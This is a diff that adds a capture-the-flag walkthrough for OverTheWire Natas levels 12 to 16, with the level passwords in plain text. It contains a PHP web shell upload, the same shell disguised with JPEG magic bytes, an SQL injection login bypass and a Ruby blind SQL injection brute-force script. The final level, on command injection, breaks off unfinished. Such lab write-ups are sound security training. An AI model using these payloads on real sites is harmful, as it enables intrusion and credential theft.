@@ -225,6 +225,136 @@ Password for *natas12*: **EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**
 **pass:** *EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3*  
 **url:** [http://natas12.natas.labs.overthewire.org](http://natas12.natas.labs.overthewire.org)
 
+So we got a file upload form. Looking at the source code, it takes whatever file we give it, 
+generates a random name for it and then appends ".jpg" to it. But I don't see anywhere in the 
+code that actually confirms we're uploading a JPG. Can we just upload a malicious PHP script?
+
+`<?php system('cat /etc/natas_webpass/natas13'); ?>`
+
+Not quite. If we look at source closer, the ".jpg" extension added in the hidden input `filename` 
+is what gets passed to `makeRandomPath()`. So how can we force our PHP extension?
+
+Well we know that file extension is being set client-side. So we can just intercept the POST 
+request and change it to ".php".
+
+And we click on our successfully uploaded PHP script. We get our password!
+
+Password for *natas13*: **jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**
+
+## Natas 13
+
+**user:** *natas13*  
+**pass:** *jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*  
+**url:** [http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)
+
+Ok same thing as the last challenge, but now they have wised up to actually checking if we are 
+submitting a JPG with `exif_imagetype()`.
+
+Too bad that method only checks the first few bytes looking for an file signature. 
+
+You can see a [list of file signatures here](https://en.wikipedia.org/wiki/List_of_file_signatures)
+
+As long as our malicious PHP scripts first few bytes are "\xFF\xD8\xFF\xDB", we'll get past this 
+filter.
+
+`ÿØÿÛ<? system('cat /etc/natas_webpass/natas14'); ?>`
+
+Of course, we'll have to intercept the request and change the extension again but after that, our 
+upload will succeed and we see our password!
+
+Password for *natas14*: **Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1**
+
+## Natas 14
+
+**user:** *natas14*  
+**pass:** *Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1*  
+**url:** [http://natas14.natas.labs.overthewire.org](http://natas14.natas.labs.overthewire.org)
+
+So this time, we have a login form. But thankfully, the source code has been given to us once 
+again. Our inputs are being passed directly into an SQL query without any sanitization or anything. 
+Smells like SQL injection to me. Let's just login for *natas15* and cancel out the password check.
+
+For that, just use the username: `natas15"-- ` (Don't forget the space at the end for it to be a 
+valid MySQL comment)
+
+And we successfully logged in!
+
+Password for *natas15*: **AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J**
+
+## Natas 15
+
+**user:** *natas15*  
+**pass:** *AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J*  
+**url:** [http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)
+
+So this time, we just have a form to check for the existence of a user. But it obviously doesn't 
+leak the password. Looking at the source code, there is again no sanitation done on our input. This 
+is what is called a Blind SQL injection because we don't actually see the results of the query. But 
+we do get two very different messages based on the results. If our query returns a result, we get 
+"This user exists."
+
+We can use this and some SQL trickery to brute force the password.
+
+First let's figure out the length of the password using a query like this.
+
+`natas16" and length(password)>1-- `
+
+And of course we get "This user exists". We can keep incrementing the length until we see the 
+message "This user doesn't exist."
+
+Finally we figure out that the password for *natas16* is 32 characters long.
+
+All right, now it's time to brute force. You could use tools like Burp Suite or Hydra but why 
+don't we code our own for fun...
+
+```ruby
+require 'net/http'
+
+allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+pass = ""
+32.times do |i|
+  allChars.split("").each do |c|
+    uri = URI.parse("http://natas15.natas.labs.overthewire.org/index.php")
+    params = {'username' => "natas16\" AND password LIKE BINARY \"#{pass + c}%\"-- "}
+    http = Net::HTTP.new(uri.host,uri.port)
+    req = Net::HTTP::Get.new(uri.path)
+    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
+    req.set_form_data(params)
+
+    req = Net::HTTP::Get.new(uri.path + '?' + req.body)
+    req.basic_auth("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
+
+    resp = http.request(req)
+    if resp.body.include?("This user exists")
+      pass += c
+      puts "(#{pass.length}/32) => #{pass}"
+      break
+    end
+  end
+end
+  
+puts "Password for Level 16: #{pass}"
+```
+
+Running this takes a little time because it's a 32 character password and I could probably 
+optimize it by using some `substr()` magic  but still we get the password!
+
+Password for *natas16*: **WaIHEacj63wnNIBROHeqi3p9t0m5nhmh**
+
+## Natas 16
+
+**user:** *natas16*  
+**pass:** *WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*  
+**url:** [http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)
+
+Looking at the source code for this one, we see that our input is getting `passthru()`d to the 
+`grep` command without any sanitization. So let's just terminate the command and read the 
+password file...oh wait, our input is getting sanitized. We can't use `;` or `&` to terminate/chain 
+commands. So what can we do to bypass the filter?
+
+
+
+
 
 
 
